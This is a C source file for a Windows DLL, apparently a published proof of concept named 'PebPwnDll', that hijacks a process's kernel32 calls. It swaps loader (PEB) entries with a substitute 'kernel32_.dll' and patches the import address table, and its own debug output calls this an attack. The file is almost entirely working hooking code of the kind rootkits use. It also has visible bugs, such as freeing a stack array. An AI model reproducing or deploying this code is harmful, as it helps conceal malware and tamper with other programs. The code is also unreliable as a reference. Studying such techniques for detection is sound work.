#include <stdio.h>
#include <windows.h>
#include <Ntsecapi.h>

#include "peb.h"
#define DLL_PATH "./kernel32_.dll"
#define DBG "Debug thiz motherfucker !"
#define echange(a,x,y) a=x;  \
                       x=y;  \
                       y=a;

typedef struct _EAT
{
    PULONG addrHook;
    PULONG addrSansHook;
} EAT, *PEAT;

void* PEBHookFeatIATPatching(char*, char*);
int   PEBHook(char*, char*);
int IATPatching(char*, char* );
int patchIAT(PULONG, char*, PULONG, PULONG, PEAT);
PEAT storeEAT(PULONG, PULONG);
PULONG searchInPEAT(PULONG, PEAT);


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{

    if(fdwReason == DLL_PROCESS_ATTACH)
    {
        OutputDebugString("[ PebPwnDll implémentation par 0vercl0k, idée original de Shearer & Dreg ].\n");
        PEBHookFeatIATPatching("kernel32.dll", "kernel32_.dll");
    }
    return FALSE;
}

int PEBHook(char* dllOrigin, char* dllHook)
{
    char* tapz = malloc(sizeof(char) * 1000);
    PULONG (*pRtlGetCurrentPeb)(void) = NULL, pDllHook = NULL, pDllOrigin = NULL, tmp = NULL;
    PPEB pPeb = NULL;
    PPEB_LDR_DATA pPebLdrData = NULL;
    PLIST_ENTRY pInLoadOrderModuleListStart = NULL, pInLoadOrderModuleListCurrent = NULL;
    PLDR_DATA_TABLE_ENTRY pLdrEntry = NULL, pLdrEntryDllHook = NULL, pLdrEntryDllOrigin = NULL;
    pDllHook = (PULONG)LoadLibrary(dllHook);
    pDllOrigin = (PULONG)GetModuleHandle(dllOrigin);

    if(pDllHook == NULL || pDllOrigin == NULL)
    {
        OutputDebugString("[ERREUR] La dll n'a pu être chargée.\n");
        return 0;
    }

    memset(tapz, 0, 1000);
    pRtlGetCurrentPeb = (PULONG (*)(void))GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlGetCurrentPeb");
    if(pRtlGetCurrentPeb == NULL)
        return 0;

    #ifdef DBG
    sprintf(tapz, "[DBG] RtlGetCurrentPeb : 0x%x.\n", (unsigned int)pRtlGetCurrentPeb);
    OutputDebugString(tapz);
    memset(tapz, 0, 1000);
    #endif

    pPeb = (PPEB)pRtlGetCurrentPeb();
    if(pPeb == NULL)
        return 0;

    #ifdef DBG
    sprintf(tapz, "[DBG] PEB en : 0x%x.\n", (unsigned int)pPeb);
    OutputDebugString(tapz);
    memset(tapz, 0, 1000);
    #endif

    pPebLdrData = pPeb->Ldr;

    #ifdef DBG
    sprintf(tapz, "[DBG] PEB_LDR_DATA en : 0x%x.\n", (unsigned int)pPebLdrData);
    OutputDebugString(tapz);
    memset(tapz, 0, 1000);
    #endif

    pInLoadOrderModuleListStart   = pPebLdrData->InLoadOrderModuleList.Blink;
    pInLoadOrderModuleListCurrent = pPebLdrData->InLoadOrderModuleList.Flink;

    while(pInLoadOrderModuleListStart != pInLoadOrderModuleListCurrent)
    {
        pLdrEntry = (PLDR_DATA_TABLE_ENTRY)pInLoadOrderModuleListCurrent;

        if(pLdrEntry->BaseAddress == pDllHook)
            pLdrEntryDllHook = pLdrEntry;

        if(pLdrEntry->BaseAddress == pDllOrigin)
            pLdrEntryDllOrigin = pLdrEntry;

        #ifdef DBG
        sprintf(tapz, "[DBG] LDR_DATA_TABLE_ENTRY : %x.\n", (unsigned int)pInLoadOrderModuleListCurrent);
        OutputDebugString(tapz);
        memset(tapz, 0, 1000);
        #endif

        pInLoadOrderModuleListCurrent = pLdrEntry->InLoadOrderModuleList.Flink;
    }

    pLdrEntry = (PLDR_DATA_TABLE_ENTRY)pInLoadOrderModuleListCurrent;

    if(pLdrEntry->BaseAddress == pDllHook)
        pLdrEntryDllHook = pLdrEntry;

    if(pLdrEntry->BaseAddress == pDllOrigin)
        pLdrEntryDllOrigin = pLdrEntry;

        #ifdef DBG
        sprintf(tapz, "[DBG] LDR_DATA_TABLE_ENTRY : %x.\n", (unsigned int)pInLoadOrderModuleListCurrent);
        OutputDebugString(tapz);
        memset(tapz, 0, 1000);
        #endif

    if(pLdrEntryDllHook == NULL || pLdrEntryDllOrigin == NULL)
    {
        OutputDebugString("[ERREUR] Les deux LDR_DATA_ENTRY_TABLE n'ont pu être trouvé.\n");
        return 0;
    }

    #ifdef DBG
    sprintf(tapz, "\n[DBG] LDR_DATA_ENTRY_TABLE de la dll hook : 0x%x.\n", (unsigned int)pLdrEntryDllHook);
    OutputDebugString(tapz);
    memset(tapz, 0, 1000);

    sprintf(tapz, "\tImageBase : 0x%x\n\tEntryPoint : 0x%x\n\tSizeOfImage : 0x%x\n\n", (unsigned int)pLdrEntryDllHook->BaseAddress, (unsigned int)pLdrEntryDllHook->EntryPoint, (unsigned int)pLdrEntryDllHook->SizeOfImage);
    OutputDebugString(tapz);
    memset(tapz, 0, 1000);

    sprintf(tapz, "[DBG] LDR_DATA_ENTRY_TABLE de la dll hooké : 0x%x.\n", (unsigned int)pLdrEntryDllOrigin);
    OutputDebugString(tapz);
    memset(tapz, 0, 1000);

    sprintf(tapz, "\tImageBase : 0x%x\n\tEntryPoint : 0x%x\n\tSizeOfImage : 0x%x\n\n", (unsigned int)pLdrEntryDllOrigin->BaseAddress, (unsigned int)pLdrEntryDllOrigin->EntryPoint, (unsigned int)pLdrEntryDllOrigin->SizeOfImage);
    OutputDebugString(tapz);
    memset(tapz, 0, 1000);
    #endif

    echange(tmp, pLdrEntryDllHook->BaseAddress, pLdrEntryDllOrigin->BaseAddress);
    echange(tmp, pLdrEntryDllHook->SizeOfImage, pLdrEntryDllOrigin->SizeOfImage);
    echange(tmp, pLdrEntryDllHook->EntryPoint,  pLdrEntryDllOrigin->EntryPoint);

    #ifdef DBG
    sprintf(tapz, "[DBG] Kernel32.dll en 0x%x.\n", (unsigned int)GetModuleHandle("kernel32.dll"));
    OutputDebugString(tapz);
    memset(tapz, 0, 1000);
    #endif

    free(tapz);
    return 1;
}

void* PEBHookFeatIATPatching(char* dllOrigin, char* dllHook)
{
    PEBHook(dllOrigin, dllHook);
    IATPatching(dllOrigin, dllHook);

    #ifdef DBG
    OutputDebugString("[DBG] Attaque complète.\n");
    #endif
    return NULL;
};

PEAT storeEAT(PULONG pDllHook, PULONG pDllHooked)
{
    PIMAGE_EXPORT_DIRECTORY pImgExportHook = NULL, pImgExportHooked = NULL;
    DWORD nbFunct = 0;
    PEAT eatStorage = NULL;
    PDWORD rvaAddrFunctsHooked = NULL, rvaAddrFunctsHook = NULL;
    int i = 0;

    pImgExportHook   = (PIMAGE_EXPORT_DIRECTORY)(((PIMAGE_NT_HEADERS)(((PIMAGE_DOS_HEADER)pDllHook)->e_lfanew + (PUCHAR)pDllHook))->OptionalHeader.DataDirectory[0].VirtualAddress + (PUCHAR)pDllHook);
    pImgExportHooked = (PIMAGE_EXPORT_DIRECTORY)(((PIMAGE_NT_HEADERS)(((PIMAGE_DOS_HEADER)pDllHooked)->e_lfanew + (PUCHAR)pDllHooked))->OptionalHeader.DataDirectory[0].VirtualAddress + (PUCHAR)pDllHooked);

    if(pImgExportHook->NumberOfFunctions != pImgExportHooked->NumberOfFunctions)
    {
        OutputDebugString("[ERREUR] Les deux dlls n'exportent pas le même nombre de fonctions !\n");
        return NULL;
    }

    nbFunct    = pImgExportHooked->NumberOfFunctions;
    eatStorage = (PEAT)malloc(sizeof(EAT) * (nbFunct+1));
    memset(eatStorage, 0, sizeof(EAT)*(nbFunct+1));

    if(eatStorage == NULL)
        return NULL;

    rvaAddrFunctsHooked = (PULONG)(pImgExportHooked->AddressOfFunctions + (PUCHAR)pDllHooked);
    rvaAddrFunctsHook = (PULONG)(pImgExportHook->AddressOfFunctions + (PUCHAR)pDllHook);

    for(; i < nbFunct ; i++)
    {
        eatStorage[i].addrHook     = (PULONG)(rvaAddrFunctsHook[i] + (PUCHAR)pDllHook);
        eatStorage[i].addrSansHook = (PULONG)(rvaAddrFunctsHooked[i] + (PUCHAR)pDllHooked);
    }

    OutputDebugString("[DBG] Eat dumped !\n");

    return eatStorage;
}

int patchIAT(PULONG pBin, char* dll2Patch, PULONG pDllHook, PULONG pDllHooked, PEAT pEat)
{

    PIMAGE_DOS_HEADER pImgDos = NULL;
    PIMAGE_NT_HEADERS pImgNt = NULL;
    PIMAGE_IMPORT_DESCRIPTOR pImgImport = NULL;
    PIMAGE_THUNK_DATA pImgFirstThunk = NULL;
    PULONG pApiAddr = NULL, newAddr = NULL;
    DWORD oldProtect = 0;
    char* dll = NULL, tapz[512]= {0};
    BOOL check = FALSE;

    pImgDos = (PIMAGE_DOS_HEADER)pBin;
    pImgNt  = (PIMAGE_NT_HEADERS)(pImgDos->e_lfanew + (PUCHAR)pImgDos);
    pImgImport = (PIMAGE_IMPORT_DESCRIPTOR)(pImgNt->OptionalHeader.DataDirectory[1].VirtualAddress + (PUCHAR)pImgDos);

    while(*(PDWORD)pImgImport != 0)
    {
        dll               = (PUCHAR)pImgDos + pImgImport->Name;
        pImgFirstThunk    = (PIMAGE_THUNK_DATA)((PUCHAR)pImgDos + pImgImport->FirstThunk);

        if(_stricmp(dll, dll2Patch) != 0)
        {
            pImgImport++;
            continue;
        }
        else
        {
            check = TRUE;
            break;
        }
    }

    if(check)
    {
        #ifdef DBG
        sprintf(tapz, "[DBG] Patch de l'iat du binaire, concernant la dll '%s'.\n", dll2Patch);
        OutputDebugString(tapz);
        memset(tapz, 0, 512);
        #endif

        while(*(PDWORD)pImgFirstThunk != 0)
        {
            pApiAddr = (PULONG)(&pImgFirstThunk->u1.Function);
            newAddr = searchInPEAT((PULONG)*pApiAddr, pEat);
            if(newAddr == NULL)
            {
                #ifdef DBG
                OutputDebugString("[ERREUR] La fonction importée n'a pas trouver de correspondance dans la table.\n");
                #endif
                return 0;
            }

            #ifdef DBG
            //sprintf(tapz, "[DBG] IMPORT Before 0x%x @ 0x%x\n", (unsigned int)*pApiAddr, (unsigned int)pApiAddr);
            //OutputDebugString(tapz);
            //memset(tapz, 0, 512);
            #endif

            VirtualProtect(pApiAddr, sizeof(ULONG), PAGE_EXECUTE_READWRITE, &oldProtect);
            *pApiAddr = (ULONG)newAddr;
            VirtualProtect(pApiAddr, sizeof(ULONG), oldProtect, &oldProtect);

            #ifdef DBG
            //sprintf(tapz, "[DBG] IMPORT After 0x%x @ 0x%x\n", (unsigned int)*pApiAddr, (unsigned int)pApiAddr);
            //OutputDebugString(tapz);
            //memset(tapz, 0, 512);
            #endif

            pImgFirstThunk++;
        }
    }

    #ifdef DBG
    OutputDebugString("[DBG] Patch du binaire terminé.\n");
    #endif

    return 1;
}

PULONG searchInPEAT(PULONG addr, PEAT pEat)
{
    PULONG ret = NULL;

    while(*(PULONG)pEat != 0)
    {
        if(pEat->addrSansHook == addr)
        {
            ret = pEat->addrHook;
            break;
        }
        pEat++;
    }
    return ret;
}

int IATPatching(char* dllHooked, char* dllHook)
{
    PEAT pEat = NULL;
    char* tapz[1000] = {0};
    PULONG pDllHook = NULL, pDllHooked = NULL;

    pDllHooked = (PULONG)GetModuleHandle(dllHook);
    pDllHook = (PULONG)GetModuleHandle(dllHooked);

    if(pDllHook == NULL || pDllHooked == NULL)
        return 0;

    //Dump de l'eat des deux modules, afin de patcher les iats
    pEat = storeEAT(pDllHook, pDllHooked);
    if(pEat == NULL)
    {
        OutputDebugString("[ERREUR] Erreur lors du dump de l'eat.\n");
        return 0;
    }


    //Patching de l'iat du module pour qu'il appelle les fonctions de la dll hook, et non de la dll originale

    #ifdef DBG
    OutputDebugString("[DBG] Patch de l'iat du binaire..\n");
    #endif

    patchIAT((PULONG)GetModuleHandle(NULL), dllHooked, pDllHook, pDllHooked, pEat);


    //Patching des iats des modules qui importent des fonctions de la dll hooké, afin que tout les appels soit redirigé vers notre dll de hook

    //[..]

    free(tapz);
    free(pEat);
    return 1;
}
